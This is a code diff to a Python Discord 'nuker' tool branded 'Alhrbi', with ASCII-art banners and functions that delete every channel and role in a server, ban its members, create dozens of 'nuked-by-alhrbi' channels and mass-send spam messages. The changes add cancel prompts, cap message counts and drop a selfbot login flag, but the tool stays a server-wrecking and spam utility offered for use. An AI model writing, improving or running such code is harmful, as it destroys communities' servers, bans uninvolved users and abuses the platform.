@@ -27,15 +27,12 @@ def reset_cancel():
 
 async def wait_cancel():
     global cancel
-    loop = asyncio.get_event_loop()
+    loop = asyncio.get_running_loop()
     await loop.run_in_executor(None, input, YELLOW + "\n[!] Press ENTER to cancel: ")
     cancel = True
 
 SPAM = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]
 NAMES = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]
-
-def clean(text):
-    return re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', text)
 
 def printc(text, color=YELLOW):
     print(color + text)
@@ -74,12 +71,12 @@ LOGO_MAIN = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠁⠈⡽⡆⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⢄⠀⠀⠀⠀⠉⠻⠓⢤⢀⣀⡀⣧⠀⠀⢰⣜⢻⡇⢻⣿⠀⠸⠄⣱⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠉⣷⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣺⢸⢀⢰⣿⣾⠀⠘⡇⠀⠀⡑⡏⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⠹⣜⣄⣻⡇⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⢸⣾⡟⡸⢀⣶⠃⠀⠀⠃⠃⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⢾⢉⣯⣄⢷⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣷⢻⡆⣿⣶⣷⣯⠏⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣀⠟⠁⣹⠇⣯⡏⠎⣦⠀⠀⠀⠈⢧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠑⢸⣷⣿⣽⡍⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣝⢸⠜⡯⣁⠋⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⢸⣿⠛⣿⣗⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡌⠈⢸⢮⡇⣮⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⢀⣾⡋⢨⣯⠿⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠙⠀⢣⠃⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⣾⢻⣶⡜⡏⠀⠻⣣⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠄⠀⢈⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠂⣷⠓⣶⡗⠀⠀⠈⠒⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⢾⢉⣯⣄⢷⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣷⢻⡆⣿⣶⣷⣯⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣀⠟⠁⣹⠇⣯⡏⠎⣦⠀⠀⠀⠈⢧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠑⢸⣷⣿⣽⡍⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣝⢸⠜⡯⣁⠋⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⢸⣿⠛⣿⣗⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡌⠈⢸⢮⡇⣮⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠂⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⢀⣾⡋⢨⣯⠿⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠙⠀⢣⠃⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⣾⢻⣶⡜⡏⠀⠻⣣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠄⠀⢈⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠂⣷⠓⣶⡗⠀⠀⠈⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠀⠘⢆⡀⠀⠀⠀⠀⣀⣀⠀⡀⣀⡀⡀⡀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡰⠉⡄⢀⡻⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⣠⠊⠀⠀⣇⡼⠁⠀⠀⠘⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠈⠛⠋⠃⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⢽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -185,7 +182,7 @@ BYE = r"""
 ALHRBI_ART = r"""
 ⠀⢀⢺⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⡇⠀⡀⢀⠠⢀⠠⠀⠄⠠⠀⠄⡀⠄⢠⠀⡄⢠⠀⡄⢠⠀⠤⡀⠤⠠⠄⠤⠠⠄⠤⡐⢠⠐⡄⠢⢄⠢⡐⡄⢆⠄⠀⠀⠀⠀⠀⢄⠢⡄⢤⠠⠄⠄⠀⠀⠀⠀⠀⠂⠠⠐⡤⢐⠲⡘⢤⢂⡔⣠⢂⡔⢠⢂⡔⢠⢂⠔⡠⢂⡔⡠⠄⡢⢄⡰⠠⠄⠤⡐⠠⠄⠤⡀⠤⠠⠄⠤⠠⠄⠤⡀⠀
 ⠀⠀⡘⣿⣿⣿⣿⣿⣿⣷⣤⣴⣿⣿⣿⣿⣿⠃⢀⠐⡀⠂⠄⢂⠡⢈⠔⡉⠄⢀⠘⡠⠡⠌⡄⢡⠘⡠⢉⠤⡑⢨⠁⢎⠰⡁⢎⡰⢁⢣⢉⡌⡱⣈⠥⡑⡜⡨⠜⠀⠀⠀⠀⠀⢊⠖⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠉⡖⣌⠲⣄⠣⡜⣡⢊⡔⢣⠌⣎⡑⢣⠜⣡⠠⢜⢂⠖⡩⢌⡱⣈⠥⣉⠆⡱⣈⠱⣈⠆⡱⡈⢆⡁⠀
-⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⡀⢂⠂⡌⢘⡀⢃⠌⡐⠢⢌⠂⠀⠁⢆⠱⡈⠔⡡⢊⠔⡡⢢⢑⡡⠍⡬⠑⡜⢢⢡⢋⡔⢣⠜⡡⢎⠲⣉⠖⣱⢩⠀⠀⠀⠀⠀⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢌⠳⣘⢤⠣⢎⡵⢚⡤⢫⡕⢮⡁⠀⢈⠎⣜⠱⣊⠴⣡⠚⡤⡙⠴⣨⠑⢦⠩⡔⠱⡌⠄⠀
+⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⡀⢂⠂⡌⢘⡀⢃⠌⡐⠢⢌⠂⠀⠁⢆⠱⡈⠔⡡⢊⠔⡡⢢⢑⡡⠍⡬⠑⡜⢢⢡⢋⡔⢣⠜⡡⢎⠲⣉⠖⣱⢩⠀⠀⠀⠀⠀⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢌⠳⣘⢤⠣⢎⡵⢚⡤⢫⡕⢮⡁⠀⢈⠎⣜⠱⣊⠴⣡⠚⡤⡙⠴⣨⠑⢦⠩⡔⠱⡌⠄⠀
 ⠀⠀⠀⠀⠀⠨⢉⣉⠉⠉⠉⢉⠉⡉⢁⢀⠂⠔⡁⢢⠘⡀⢆⠡⢊⠰⡁⢆⠂⠀⡉⢆⠱⣈⢒⠡⢎⡘⠴⡡⠎⠴⣉⠖⡩⢜⡡⢎⠖⡬⢃⡞⡱⢊⡵⢡⠞⣡⠖⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣉⠶⣙⢎⠶⣩⠖⣣⢞⣡⠂⠄⡩⢚⣌⢳⡘⢦⡅⢏⡴⣉⠖⣡⢋⢆⠳⣌⠳⢌⠅⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠠⠌⡐⢀⠢⢈⠂⠔⡁⠢⢑⠂⡅⢊⠤⠑⡂⠄⠐⡐⠬⡑⠤⢋⠔⢪⡐⢣⠜⣩⠒⡥⢊⡕⢎⠼⡘⢎⡱⣍⠲⣍⠳⣌⠧⡛⡴⠩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢌⢞⡱⢎⡳⢥⡛⢦⣋⠖⢀⠠⢡⢋⠦⢣⡙⢆⠞⡌⡖⡡⠞⡤⢋⡌⢣⢆⡹⢌⠂⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠐⠀⠂⠀⠈⠐⠀⠁⠂⠁⠈⠀⠌⠂⠁⠀⢂⡘⠄⠑⠈⠂⠉⠂⠌⠁⠊⠄⠙⠀⠃⠘⠌⠒⠉⠎⠰⠌⠓⠌⠓⠌⠲⠙⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠈⠊⠘⠡⠙⠂⠙⠂⠉⠂⠨⠄⣣⠆⠉⠂⠉⠌⠘⠠⠁⠁⠃⠌⠁⠘⠀⠂⠐⠈⠀⠀
@@ -307,7 +304,7 @@ async def rename_ch(ch, name):
 
 async def send_msg(ch, msg):
     try:
-        await ch.send(msg + " @everyone")
+        await ch.send(msg)
         return True
     except:
         return False
@@ -317,6 +314,7 @@ async def nuke_guild(g):
     reset_cancel()
     
     printc("[+] Deleting all channels...")
+    task = asyncio.create_task(wait_cancel())
     chs = list(g.channels)
     if chs:
         for ch in chs:
@@ -324,9 +322,12 @@ async def nuke_guild(g):
                 break
             await del_channel(ch)
             await asyncio.sleep(0.05)
+    task.cancel()
     printc("[+] Channels deleted")
     
     printc("[+] Deleting all roles...")
+    reset_cancel()
+    task = asyncio.create_task(wait_cancel())
     roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
     if roles:
         for r in roles:
@@ -334,9 +335,12 @@ async def nuke_guild(g):
                 break
             await del_role(r)
             await asyncio.sleep(0.05)
+    task.cancel()
     printc("[+] Roles deleted")
     
     printc("[+] Banning all members...")
+    reset_cancel()
+    task = asyncio.create_task(wait_cancel())
     members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
     if members:
         for m in members:
@@ -344,9 +348,12 @@ async def nuke_guild(g):
                 break
             await ban_member(m)
             await asyncio.sleep(0.02)
+    task.cancel()
     printc("[+] Members banned")
     
     printc("[+] Creating new channels...")
+    reset_cancel()
+    task = asyncio.create_task(wait_cancel())
     channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
     for i in range(50):
         if check_cancel():
@@ -354,6 +361,7 @@ async def nuke_guild(g):
         name = random.choice(channel_names)
         await create_ch(g, name)
         await asyncio.sleep(0.05)
+    task.cancel()
     printc("[+] Channels created")
     
     reset_cancel()
@@ -531,6 +539,9 @@ async def handle_send_all(g):
     if not count.isdigit():
         return
     count = int(count)
+    if count > 100:
+        printc("[!] Max 100 messages per channel")
+        count = 100
     task = asyncio.create_task(wait_cancel())
     tasks = []
     total = 0
@@ -703,7 +714,7 @@ async def start():
                         printc("[X] Guild not found")
                         await bot.close()
                 try:
-                    await bot.start(token, bot=False)
+                    await bot.start(token)
                     break
                 except:
                     printc("[X] Connection failed")
